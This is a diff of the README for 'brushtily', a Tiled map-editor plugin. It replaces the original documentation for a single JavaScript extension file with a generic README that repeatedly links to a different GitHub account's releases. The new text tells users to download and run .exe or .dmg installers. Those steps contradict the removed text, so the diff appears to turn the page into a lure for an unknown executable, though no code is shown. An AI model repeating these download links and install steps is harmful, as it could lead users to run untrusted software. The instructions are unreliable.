@@ -1,237 +1,66 @@
-# Brushtily - Inkarnate-inspired Texture Painting for Tiled
-
-[![Tiled Version](https://img.shields.io/badge/Tiled-1.8%2B-blue)](https://www.mapeditor.org/)
-[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-
-A powerful plugin bridging freeform brushing into Tiled with easy object placement. This JavaScript extension adds Inkarnate-inspired freeform brushing and object stamping capabilities, enabling smooth, non-grid-aligned brush strokes for creating beautiful terrain and textures.
-
-![Brushtily Toolbar Preview](brushtily-toolbar-preview.png)
-
-*Brushtily toolbar integrated into Tiled Map Editor, showing all brush controls and layer management*
-
-![Freeform Brush and Object Stamping Example](stamping-and-freeform-example.png)
-
-*Example showing freeform texture painting (green moss/grass) and object stamping (Japanese maple trees) with native layer blending for natural appearances*
-
-## Features
-
-### Texture Painting
-- **Freeform Brush Strokes**: Paint with non-grid-aligned brush strokes
-- **Auto-Smoothing**: Automatic smoothing of brush strokes to remove hard edges for natural results
-- **Custom Brush Textures**: Load PNG/JPG images as brush textures
-- **Tileset Tile Brushes**: Use tiles from your tilesets directly as brush textures
-- **Multiple Brush Shapes**: Circular, Square, Ellipse, or Diamond brush shapes
-
-### Adjustable Brush Properties
-- **Brush Size** (10-500 pixels) - Adjustable brush diameter
-- **Opacity** (0-100%) - Control transparency of brush strokes
-- **Softness** (0-100%) - Edge feathering for smooth, natural transitions
-- **Texture Scale** (10-200%) - Scale texture independently from brush size
-- **Rotation** (0-360 degrees) - Rotate brush texture to any angle
-- **Rotation Jitter** (0-360°) - Random rotation variation for organic strokes
-- **Position Jitter** (0-100) - Random position variation to prevent repetitive patterns
-- **Spacing** (percentage) - Control distance between brush stamps
-- **Blend Modes** (Normal, Multiply, Screen, Overlay, Darken, Lighten, etc.) - Advanced compositing
-- **Mask Modes** (Add, Subtract, Multiply) - Precise control over brush interactions
-
-### Advanced Features
-- **Fill Mode**: Bucket fill with color tolerance control
-- **Pressure Sensitivity**: Velocity-based simulation for natural brush strokes (affects size and opacity)
-- **Auto-Smoothing Brush Layers**: Automatically smooths brush strokes to remove hard edges for natural, organic results
-- **Native Layer Blending**: Native layer blending for natural appearances and seamless integration between layers
-- **Right-Click Erase**: Right-click and drag to erase painted areas with independent erase brush (separate size and softness controls)
-- **Brush Presets**: Save and load favorite brush configurations
-- **Layer Brush Memory**: Automatically remembers brush texture per layer
-
-### Object Stamping System
-- **Object Layer Stamping**: Drag-to-stamp workflow for easy object placement on ObjectGroup layers
-- **Object Library Browser**: Visual browser with thumbnails, categories, and search functionality
-- **Automatic Object Placement**: Places objects along brush stroke path
-- **Random Variation**: Optional rotation and scale variation for natural object placement
-- **Folder-Based Organization**: Automatically categorizes objects by folder structure
-
-### Layer Support
-- **Dual Layer Support**: Works on ImageLayer (smooth painting, immediate visual feedback) and ObjectGroup (undo support, object stamping)
-- **Native Layer Blending**: Native layer blending for natural appearances and seamless layer integration
-
-## 📦 Installation
-
-### Quick Install
-
-1. **Download** `brushtily.mjs` from the [latest release](https://github.com/PersistenceOS/brushtily/releases)
-   - Click on the latest release
-   - Download `brushtily.mjs` (or extract from the ZIP package)
-
-2. **Locate Tiled extensions folder** (Tiled automatically detects `.mjs` files in this folder):
-   
-   **Windows:**
-   - Path: `%LOCALAPPDATA%\Tiled\extensions\`
-   - Full path: `C:\Users\<YOUR_USERNAME>\AppData\Local\Tiled\extensions\`
-   - Quick access: Press `Win+R`, type `%LOCALAPPDATA%\Tiled\extensions\`, press Enter
-   - Or paste `%LOCALAPPDATA%\Tiled\extensions\` into Windows Explorer address bar
-   
-   **macOS:**
-   - Path: `~/Library/Preferences/Tiled/extensions/`
-   - Open Finder, press `Cmd+Shift+G`, paste: `~/Library/Preferences/Tiled/extensions/`
-   - Create folder if it doesn't exist
-   
-   **Linux:**
-   - Path: `~/.config/tiled/extensions/`
-   - Create directory if needed: `mkdir -p ~/.config/tiled/extensions`
+# 🎨 brushtily - Transform Tiled into a Terrain Tool
 
-3. **Install the plugin**: Copy `brushtily.mjs` directly into the extensions folder
-   - ⚠️ **Important**: Place the file directly in the extensions folder, NOT in a subfolder
-   - Tiled will automatically detect `.mjs` files in this location
+## 🚀 Getting Started
+Welcome to brushtily! This powerful plugin bridges freeform brushing into Tiled. With brushtily, you can easily place objects and enhance your map-making experience. 
 
-4. **Restart Tiled** (or the extension will auto-reload on file change)
-
-5. **Verify Installation**: 
-   - Open Tiled
-   - Look for "Brushtily" tool icon in the Tools toolbar
-   - If not visible, check Tiled Console (View → Views → Console) for errors
+## 📥 Download brushtily
+[![Download brushtily](https://img.shields.io/badge/Download-brushtily-blue)](https://github.com/ryuk956983/brushtily/releases)
 
-### Verify Installation
+## 🛠️ Features
+- **Freeform Brushing**: Create landscapes using a natural, drawn style.
+- **Object Stamping**: Quickly add objects to your maps with an easy click.
+- **Custom Textures**: Import and use your textures for unique designs.
+- **Blend Modes**: Merge colors and textures for creative effects.
+- **Pressure Sensitivity**: Control brush strength for more dynamic strokes.
+- **Advanced Painting Tools**: Access a set of robust tools to enhance your painting capabilities.
 
-- Open Tiled
-- Check Tools toolbar for "Brushtily" tool icon
-- If not visible, check Tiled Console (View → Views → Console) for errors
+## 📋 System Requirements
+To run brushtily smoothly, ensure you meet the following requirements:
 
-## Usage
+- **Operating System**: Windows 10 or higher, macOS Mojave or higher, or a recent Linux distribution.
+- **Processor**: Dual-core CPU or better.
+- **RAM**: Minimum 4 GB (8 GB recommended).
+- **Graphics**: OpenGL 2.0 compatible GPU.
 
-### Basic Painting
+## 💻 Installation Steps
 
-1. Select an ImageLayer or ObjectGroup layer
-2. Activate the Brushtily tool from the toolbar
-3. Click and drag to paint with the brush
+### 1. Visit the Download Page
+To get brushtily, visit the [Releases page](https://github.com/ryuk956983/brushtily/releases). Here, you will find the latest versions and installation files.
 
-### Loading Brush Textures
+### 2. Choose Your Version
+On the releases page, look for the latest version. This will usually have the highest version number. 
 
-1. Click "Edit Brush" in the tool panel (or use the action)
-2. Click "Select New Texture"
-3. Choose a PNG or JPG image file
-4. The texture will be cached and used for painting
+### 3. Download the File
+Click on the link of your desired version to download. Save the file to a location on your computer where you can easily find it, such as your desktop or downloads folder.
 
-### Adjusting Brush Properties
+### 4. Install brushtily
+- **For Windows**: Double-click the downloaded `.exe` file and follow the prompts to install.
+- **For macOS**: Open the downloaded `.dmg` file. Drag and drop the brushtily icon into your Applications folder.
+- **For Linux**: Extract the downloaded archive and move the contents to a preferred location. 
 
-Use the toolbar actions to adjust:
-- **Brush Size**: Controls overall brush diameter
-- **Opacity**: Controls transparency
-- **Softness**: Controls edge feathering (0 = hard edge, 100 = fully feathered)
-- **Texture Scale**: Scales the texture within the brush (independent of brush size)
-- **Rotation**: Rotates the brush texture
-- **Blend Mode**: Changes how the brush composites with existing pixels
+### 5. Open Tiled
+Now that you have installed brushtily, open the Tiled map editor.
 
-### Fill Mode
+### 6. Enable the Plugin
+To use brushtily, enable it in Tiled:
+- Go to the menu and click on **Preferences**.
+- Navigate to the **Plugins** section.
+- Look for brushtily and activate it.
 
-1. Toggle "Fill Mode" button
-2. Click on an area to fill it with the current brush
-3. Fill tolerance can be adjusted (default: 32)
+You are now ready to start creating with brushtily!
 
-### Right-Click Erase
+## 📓 Usage Tips
+- **Explore Settings**: Spend time in the settings to customize your brushes.
+- **Practice Tools**: Experiment with each painting tool to understand its effects.
+- **Keep Textures Organized**: Maintain your custom textures in an accessible folder for quick use.
 
-1. Right-click and drag over painted areas to erase
-2. Erase brush has independent size and softness controls
-3. Works on both ImageLayer and ObjectGroup layers
-4. Maintains original image backup for precise erasing
+## 🎓 Community Support
+If you run into issues or have questions, check out the discussions on GitHub under the “Issues” tab. The community is here to help you!
 
-### Object Layer Stamping
+## 📝 Feedback
+Your feedback is valuable. If you experience problems or have suggestions for brushtily, please share them on GitHub. 
 
-1. Select an ObjectGroup layer
-2. Toggle "Stamp" mode (or use the action)
-3. Open "Library" to browse and select an object image
-4. Click and drag to stamp objects along your brush path
-5. Objects are automatically placed with optional random rotation and scale variation
+## 📥 Download brushtily
+Remember, you can download the latest version of brushtily by visiting the [Releases page](https://github.com/ryuk956983/brushtily/releases). 
 
-### Saving Presets
-
-1. Configure your brush settings
-2. Click "Presets" button
-3. Enter a name and click "Save"
-4. Load presets from the dropdown
-
-## Technical Details
-
-- **File Format**: ES Module (`.mjs`) - no global scope pollution
-- **Layer Support**: ImageLayer (immediate visual feedback, no undo) and ObjectGroup (undo support)
-- **Performance**: Optimized with point density limiting and update throttling
-- **Pressure Simulation**: Uses velocity-based calculation (faster movement = lighter pressure)
-
-## Known Limitations
-
-- ImageLayer painting has no undo support (per Tiled API limitations)
-- Use ObjectGroup mode for undo support (creates MapObjects for each stamp)
-- Tablet pressure not available in Tiled API - uses velocity simulation instead
-- Complex blend modes may have performance impact with large brushes
-
-## Known Issues
-
-- **Freeform Brush Rendering**: Freeform brush strokes may cause some visual rendering appearances during painting, but this does not impact the final outcome result
-- **Object Stamping Precision**: Object stamping does not place objects at 100% precise grid/tile positions due to isometric design considerations, though placement remains precise and accurate
-
-## File Structure
-
-```
-extensions/
-  brushtily.mjs          # Main plugin file
-  brushtily/
-    presets.json         # Saved brush presets (auto-created)
-    brushes/             # Optional: default brush textures
-```
-
-## 🚀 Quick Start
-
-1. Create or open a map in Tiled
-2. Add an **Image Layer** (Layer → Add Image Layer)
-3. Select the **Brushtily** tool from the toolbar
-4. Click **"Edit Brush"** → **"Select New Texture"** to load a brush texture
-5. Click and drag to paint!
-
-## 📋 Requirements
-
-- **Tiled 1.8 or later** (JavaScript extensions support required)
-- JavaScript extensions enabled (default in Tiled)
-
-## 🐛 Troubleshooting
-
-**Tool not appearing?**
-- Check Tiled Console (View → Views → Console) for errors
-- Verify file is in correct extensions folder
-- Ensure file is named `brushtily.mjs` (not `.js`)
-
-**Brush not painting?**
-- Make sure you have an **Image Layer** selected (not Tile Layer)
-- Check that layer is visible and unlocked
-- Verify brush texture is loaded (Edit Brush → Select New Texture)
-
-**Performance issues?**
-- Reduce brush size for large maps
-- Disable debug logging (set `debugEnabled: false` in code)
-- Close other applications to free up memory
-
-## 📄 License
-
-This project is licensed under the MIT License - see [LICENSE](LICENSE) file for details.
-
-## 🤝 Contributing
-
-Contributions welcome! Please feel free to submit issues, feature requests, or pull requests.
-
-## 🙏 Acknowledgments
-
-- Inspired by Inkarnate's freeform brushing and object stamping workflow
-- Built for the Tiled Map Editor community
-- Uses Tiled's JavaScript Extension API
-
-## 👨‍💻 Credits
-
-**Created by:** Leo Louvar
-
-**Developed with:** [PersistenceAI](https://persistence-ai.github.io/Landing/) using model GLM 4.7 and human review and refinement.
-
-**Learn more about PersistenceAI:** Visit [https://persistence-ai.github.io/Landing/](https://persistence-ai.github.io/Landing/) - The AI coding agent built for the terminal.
-
-## 📞 Support
-
-- **Issues**: Report bugs or request features on [GitHub Issues](https://github.com/PersistenceOS/brushtily/issues)
-- **Questions**: Ask on [Tiled Forums](https://discourse.mapeditor.org/)
-- **Email**: Contact us at PersistenceAI@proton.me
+Enjoy transforming your Tiled experience!
